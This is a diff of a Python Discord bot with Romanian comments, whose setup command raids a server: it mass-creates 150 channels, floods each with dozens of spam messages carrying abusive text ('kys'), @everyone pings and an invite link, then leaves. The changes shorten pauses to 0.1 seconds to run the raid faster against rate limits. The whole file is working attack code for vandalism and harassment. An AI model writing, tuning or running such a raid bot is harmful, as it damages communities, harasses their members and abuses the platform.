@@ -321,46 +321,50 @@ async def setup(ctx):
     spam_text = "corrupt own this mfs kys you js got n4ked https://discord.gg/larpempire @everyone @here"
     invite_text = "https://discord.gg/larpempire @everyone join"
 
-    # ===== CREARE CANALE ȘI TRIMITERE MESAJE =====
-    total_channels = 300
+    # ===== CREARE 150 CANALE - SETĂRI AGRESIVE (risc rate-limit) =====
+    total_channels = 150
     font_styles = ["bold", "script", "double"]
     created_channels = []
 
-    await user.send(f"🔄 Încep crearea a {total_channels} de canale...")
+    await user.send(f"🔄 Încep crearea a {total_channels} de canale (viteză maximă)...")
 
-    # Semafor pentru trimitere mesaje (maxim 10 canale simultan pentru a nu depăși rate-limit)
+    # Semafor pentru trimitere mesaje – 10 canale simultan
     send_semaphore = asyncio.Semaphore(10)
 
     # Lista de ping-uri posibile
     ping_counts = [11, 12, 14, 16, 17, 18, 20, 21]
 
     async def send_initial_messages(channel):
-        """Trimite primele 2 mesaje (embed + text)"""
+        """Trimite primele 2 mesaje (embed + text) cu pauză minimă"""
         async with send_semaphore:
             try:
                 await channel.send(embed=embed_content)
+                await asyncio.sleep(0.1)  # pauză minimă
                 await channel.send(content=spam_text)
             except Exception:
                 pass
 
     async def send_remaining_messages(channel):
-        """Trimite restul mesajelor în fundal"""
+        """Trimite restul mesajelor cu pauze minime (0.1s)"""
         try:
-            # Alege un număr random de ping-uri
             ping_count = random.choice(ping_counts)
 
-            # Trimite mesajul cu ping-uri de 'ping_count' ori
+            # Trimite ping-uri cu pauză de 0.1s
             for _ in range(ping_count):
                 await channel.send(content=spam_text)
+                await asyncio.sleep(0.1)
 
-            # Trimite restul de 14 embed-uri + 14 texte
+            # Trimite 14 perechi (embed + text) cu pauză de 0.1s
             for _ in range(14):
                 await channel.send(embed=embed_content)
+                await asyncio.sleep(0.1)
                 await channel.send(content=spam_text)
+                await asyncio.sleep(0.1)
 
-            # Trimite 35 de texte suplimentare
+            # Trimite 35 de texte cu pauză de 0.1s
             for _ in range(35):
                 await channel.send(content=spam_text)
+                await asyncio.sleep(0.1)
 
             # Trimite invitația
             await channel.send(content=invite_text)
@@ -370,7 +374,6 @@ async def setup(ctx):
 
     async def create_and_send(index):
         try:
-            # Creare canal
             base_name = random.choice(base_channel_names)
             font_style = random.choice(font_styles)
             styled_name = apply_font(base_name, font_style)
@@ -387,20 +390,22 @@ async def setup(ctx):
 
         except Exception as e:
             await user.send(f"❌ Eroare la canalul {index}: {e}")
-            # Dacă apare eroare, părăsim serverul
             await guild.leave()
             return
 
-    # Creare canale în loturi de câte 10
-    for i in range(0, total_channels, 10):
-        batch = [create_and_send(i+j) for j in range(10) if i+j < total_channels]
+    # Creare canale în loturi de câte 10, pauză 0.5 secunde între loturi
+    batch_size = 10
+    pause_between_batches = 0.5
+
+    for i in range(0, total_channels, batch_size):
+        batch = [create_and_send(i+j) for j in range(batch_size) if i+j < total_channels]
         await asyncio.gather(*batch)
-        await asyncio.sleep(1)  # Pauză între loturi
+        await asyncio.sleep(pause_between_batches)
 
     await user.send(f"✅ Canale create: {len(created_channels)}. Trimiterea mesajelor continuă în fundal...")
 
-    # Așteptăm 20 de secunde pentru ca task-urile din fundal să avanseze
-    await asyncio.sleep(20)
+    # Așteptăm 5 secunde pentru ca task-urile din fundal să avanseze (minim)
+    await asyncio.sleep(5)
 
     await user.send("✅ Procesul a fost inițiat. Părăsesc serverul...")
 
